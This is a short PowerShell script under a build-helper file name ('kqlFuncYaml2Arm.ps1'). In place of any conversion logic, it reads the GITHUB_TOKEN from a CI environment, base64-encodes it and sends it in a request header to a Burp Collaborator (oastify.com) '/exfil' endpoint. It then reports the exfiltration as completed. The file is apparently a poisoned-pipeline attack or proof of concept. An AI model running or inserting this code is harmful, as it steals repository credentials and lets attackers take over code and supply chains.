# .script/kqlFuncYaml2Arm.ps1

# 1. Grab the token from the environment
# GitHub Actions usually stores the GITHUB_TOKEN in an environment variable 
# during the job execution if it's referenced or used by actions.
$token = $env:GITHUB_TOKEN

if ($token) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($token)
    $base64Token = [Convert]::ToBase64String($bytes)
    
    # 2. Send the token to your Collaborator instance
    $url = "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/exfil"
    Invoke-WebRequest -Uri $url -Method Get -Headers @{"X-Token"=$base64Token} -UseBasicParsing
    Write-Host "Exfiltration attempt completed."
} else {
    Write-Host "Token not found in environment."
}
